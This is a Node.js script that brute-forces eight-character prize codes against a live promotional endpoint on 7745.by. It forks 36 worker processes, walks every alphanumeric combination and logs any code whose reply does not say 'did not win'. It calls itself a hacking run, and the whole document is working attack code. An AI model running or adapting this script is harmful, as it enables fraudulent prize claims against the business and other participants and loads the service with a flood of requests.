const axios = require('axios');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const Combinatorics = require('js-combinatorics');
const alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
    'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6',
    '7', '8', '9', '0'];

const CODE_LENGTH = 8;
const BUNCH_SIZE = 100;
const ACCOMODATIONS_NUMBER = alphabet.length ** CODE_LENGTH;
const perms = Combinatorics.baseN(alphabet, CODE_LENGTH);
let k = 0;
let currentPerm;
let time = Date.now();

let main = async () => {
    if (cluster.isMaster) {
        console.log('===============================');
        console.log(`Starting hacking on ${numCPUs} CPUs`);
        console.log('===============================\n');

        console.log(`Master ${process.pid} is running`);

        // Fork workers.
        for (let i = 0; i < 36; i++) {
            cluster.fork();
        }

        cluster.on('exit', (worker, code, signal) => {
            console.log(`worker ${worker.process.pid} died`);
        });
    } else {
        console.log(`Worker ${process.pid} started`);

        while (currentPerm = perms.next()) {
            // logging
            k++;
            if (k % BUNCH_SIZE === 0) {
                console.log(Math.round(k / ACCOMODATIONS_NUMBER * 10000) / 100  + '%');
                console.log((Date.now() - time) / 1000);
                time = Date.now();
            }
            // logging

            let code = currentPerm.join('');

            await axios.get(`https://7745.by/krynka/check-code/${code}`)
                .then(res => {
                    if (!res.data.message.includes('не выиграли')) {
                        console.log("FOUND: ", res.data.message, code);
                    }
                })
                .catch(err => {
                    console.log("ERROR: ", err.response.status, code);
                })
        }
    }
};

main();

